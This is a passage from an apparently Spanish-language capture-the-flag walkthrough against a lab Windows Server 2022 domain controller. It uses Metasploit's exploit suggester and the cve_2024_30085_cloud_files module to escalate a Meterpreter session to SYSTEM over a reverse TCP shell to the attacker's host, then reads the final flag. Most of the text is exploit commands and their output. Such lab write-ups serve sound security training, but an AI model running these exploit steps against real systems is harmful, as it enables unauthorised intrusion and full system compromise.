[*] Sending stage (230982 bytes) to 192.168.56.100
[*] Meterpreter session 1 opened (Tu_IP:443 -> 192.168.56.100:64507) at 2026-04-29 19:11:40 -0600

meterpreter > 
meterpreter > sysinfo
Computer        : DC01
OS              : Windows Server 2022 (10.0 Build 20348).
Architecture    : x64
System Language : es_ES
Meterpreter     : x64/windows
```
Ya tenemos una sesión de **Meterpreter**.

#### Escalando Privilegios con el Módulo cve_2024_30085_cloud_files {#MetasPrivesc}

Podemos utilizar el módulo `post/multi/recon/local_exploit_suggester` para que busque vulnerabilidades en la máquina, así que vamos a cargarlo y a configurarlo:
```bash
msf exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
```

Ejecutémoslo y esperemos los resultados:
```bash
msf post(multi/recon/local_exploit_suggester) > exploit
[*] 192.168.56.100 - Collecting local exploits for x64/windows...
...
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022
 4   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default
 6   exploit/windows/local/cve_2024_30085_cloud_files               Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/cve_2024_30088_authz_basep               Yes                      The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 587
 8   exploit/windows/local/cve_2024_35250_ks_driver                 Yes                      The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022
 9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 10  exploit/windows/local/virtual_box_opengl_escape                Yes                      The service is running, but could not be validated.
```
Observa que tuvimos varios resultados; sin embargo, el único que funcionará será el módulo `exploit/windows/local/cve_2024_30085_cloud_files`.

Vamos a cargarlo y a configurarlo:
```bash
msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/cve_2024_30085_cloud_files
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/local/cve_2024_30085_cloud_files) > set SESSION 1
SESSION => 1
msf exploit(windows/local/cve_2024_30085_cloud_files) > set LHOST Tu_IP
LHOST => Tu_IP
```

Ejecutémoslo:
```bash
msf exploit(windows/local/cve_2024_30085_cloud_files) > exploit
[*] Started reverse TCP handler on Tu_IP:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Launching notepad to host the exploit...
[*] The notepad path is: C:\Windows\System32\notepad.exe
[*] The notepad pid is: 1348
[*] Reflectively injecting the DLL into 1348...
[*] Sending stage (230982 bytes) to 192.168.56.100
[*] Meterpreter session 2 opened (Tu_IP:4444 -> 192.168.56.100:64564) at 2026-04-29 19:34:25 -0600

meterpreter > sysinfo
Computer        : DC01
OS              : Windows Server 2022 (10.0 Build 20348).
Architecture    : x64
System Language : es_ES
Domain          : PHANTOM
Logged On Users : 8
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
Tardó un poco, pero pudimos utilizar este módulo para escalar privilegios.

Ya solamente buscamos la última flag:
```batch
meterpreter > shell
Process 2408 created.
Channel 1 created.

Microsoft Windows [Versi�n 10.0.20348.587]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Users\robert\Documents>cd ..\..\Administrador\Desktop
cd ..\..\Administrador\Desktop

C:\Users\Administrador\Desktop>type root.txt
type root.txt
...
```
Y con esto, terminamos la máquina.

**Nota**: Esta forma de escalada de privilegios puede ser un poco inestable y puede que tarde mucho en aplicarse el módulo. Además, si utilizaste esta forma y quieres volver a usarla después, no funcionará, por lo que tendrías que desinstalar e instalar de nuevo la máquina virtual.
